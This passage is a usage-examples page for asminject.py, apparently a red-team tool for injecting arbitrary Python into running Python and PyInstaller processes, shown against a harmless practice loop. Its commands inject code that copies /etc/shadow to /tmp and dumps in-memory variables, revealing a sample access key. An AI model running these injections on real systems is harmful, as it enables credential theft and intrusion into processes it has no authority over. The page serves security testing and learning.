# asminject.py examples - Python

<a href="../README.md">[ Back to the main README.md ]</a>

## Basic examples

* [Execute arbitrary Python code inside an existing Python process](#execute-arbitrary-python-code-inside-an-existing-python-process)
* [Write all global or variables to standard out](#write-all-global-or-local-variables-to-standard-out)
* [Execute arbitrary Python code inside a PyInstaller-Compiled Binary Process](#execute-arbitrary-python-code-inside-a-pyinstaller-compiled-binary-process)

## Complex examples

* <a href="examples-python-container.md">Interact with a container only via injected Python code</a>
* <a href="examples-python-extract-and-decompile.md">Extract Python code from a running process and decompile it</a>

## Important

For all Python 3 examples, refer to the <a href="docs/specialized_options.md#specifying-non-pic-code">position-independent code discussion in the specialized options document</a>. Python 3 before 3.10 is usually not position-independent, but Python 3.10 and later usually are.

## Execute arbitrary Python code inside an existing Python process

Launch a harmless Python process that simulates one with access to super-secret, sensitive data. This example uses Python 3, but the syntax for `asminject.py` is identical for Python 2 target processes, although of course you'd need to specify script code that's valid in Python 2.

```
$ sudo python3 practice/python_loop.py

2022-05-12T19:46:46.245462 - Loop count 0
2022-05-12T19:46:51.253640 - Loop count 1
2022-05-12T19:46:56.264897 - Loop count 2
```

In a separate terminal, locate the process and inject some arbitrary Python code into it. 

This payload requires one variable: `pythoncode`, which should contain the Python script code to execute in the existing Python process.

```
# python3 ./asminject.py 2037475 execute_python_code.s \
   --relative-offsets-from-binaries \
   --var pythoncode "import os; import sys; finput = open('/etc/shadow', 'rb'); foutput = open('/tmp/bishopfox.txt', 'wb'); foutput.write(finput.read()); foutput.close(); finput.close();"
   
...omitted for brevity...
```

Verify that the file has been copied:

```
# cat /tmp/bishopfox.txt 

root:!:18704:0:99999:7:::
daemon:*:18704:0:99999:7:::
bin:*:18704:0:99999:7:::
sys:*:18704:0:99999:7:::
```

## Write all global or local variables to standard out

Use [the following Python 3 code, which was based on this Stack Overflow discussion](https://stackoverflow.com/questions/633127/viewing-all-defined-variables)

Global variables:

```
tmp = globals().copy(); [print(k,'  :  ',v,' type:' , type(v)) for k,v in tmp.items()]
```


Local variables:

```
tmp = locals().copy(); [print(k,'  :  ',v,' type:' , type(v)) for k,v in tmp.items()]
```

e.g. for global variables:

```
# python3 ./asminject.py 249594 execute_python_code.s \
   --relative-offsets-from-binaries \
   --var pythoncode "tmp = globals().copy(); [print(k,'  :  ',v,' type:' , type(v)) for k,v in tmp.items()]"
```

or for local variables:

```
# python3 ./asminject.py 249594 execute_python_code.s \
   --relative-offsets-from-binaries \
   --var pythoncode "tmp = locals().copy(); [print(k,'  :  ',v,' type:' , type(v)) for k,v in tmp.items()]"
```

Example output:

```
2022-06-09T23:08:56.301925 - Loop count 107
time   :   <module 'time' (built-in)>  type: <class 'module'>
datetime   :   <module 'datetime' from '/usr/lib/python3.9/datetime.py'>  type: <class 'module'>
example_global_var_1   :   AKIASADF9370235SUAS0  type: <class 'str'>
example_global_var_2   :   This value should not be disclosed  type: <class 'str'>
i   :   107  type: <class 'int'>
v   :   time  type: <class 'str'>
2022-06-09T23:09:05.310443 - Loop count 108
```

## Execute arbitrary Python code inside a PyInstaller-Compiled Binary Process

[The PyInstaller toolkit](https://pyinstaller.org/) allows Python developers to package their scripts into self-contained binary packages that can be run on systems that don't have a compatible Python interpreter installed (on Linux, the result is basically a collection of native-code ELF executables and libraries). Some people think of this as a form of obfuscation, as it increases the difficultly of reverse-engineering the software than if the scripts were available. But a PyInstaller package includes a fully-functional Python interpreter, so one can inject arbitrary Python code into the running process the same way as for a standard Python process.

Start by creating a PyInstaller package, if you don't already have one to test against:

```
# pip3 install pyinstaller

# cd practice

# pyinstaller python_loop.py

418 INFO: PyInstaller: 5.3
418 INFO: Python: 3.10.5
422 INFO: Platform: Linux-5.18.0-kali2-amd64-x86_64-with-glibc2.33
...omitted for brevity...
5368 INFO: Building COLLECT COLLECT-00.toc
6013 INFO: Building COLLECT COLLECT-00.toc completed successfully.

# file dist/python_loop/python_loop

dist/python_loop/python_loop: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=9230f3fa19123436d7e9b46b02c11f1e492895c1, for GNU/Linux 2.6.32, stripped

# dist/python_loop/python_loop

2022-09-09T00:50:08.907011 - Loop count 0
2022-09-09T00:50:33.419231 - Loop count 1
```

In a separate terminal, locate the process and inject code into it just like it was a regular Python process:

```
# ps auxww | grep python_loop                                                                                              

user      153818  [...] dist/python_loop/python_loop


# python3 ./asminject.py 153818 execute_python_code.s \
	--relative-offsets-from-binaries \
	--var pythoncode "tmp = globals().copy(); [print(k,'  :  ',v,' type:' , type(v)) for k,v in tmp.items()]"
```

Example output for dumping global variables:

```
2022-09-09T00:53:08.653563 - Loop count 32
...omitted for brevity...
__loader__   :   <pyimod02_importers.FrozenImporter object at 0x7f6af5260880>  type: <class 'pyimod02_importers.FrozenImporter'>
...omitted for brevity...
os   :   <module 'os' from '/[REDACTED]/practice/dist/python_loop/base_library.zip/os.pyc'>  type: <class 'module'>
...omitted for brevity...
inspect   :   <module 'inspect' from '/[REDACTED]/practice/dist/python_loop/inspect.pyc'>  type: <class 'module'>
...omitted for brevity...
example_global_var_1   :   AKIASADF9370235SUAS0  type: <class 'str'>
example_global_var_2   :   This value should not be disclosed  type: <class 'str'>
i   :   32  type: <class 'int'>
2022-09-09T00:53:17.745785 - Loop count 33
```

See the <a href="examples-python-extract-and-decompile.md">Extract Python code from a running process and decompile it</a> page for more detail on reverse-engineering the code from a running PyInstaller-based binary.
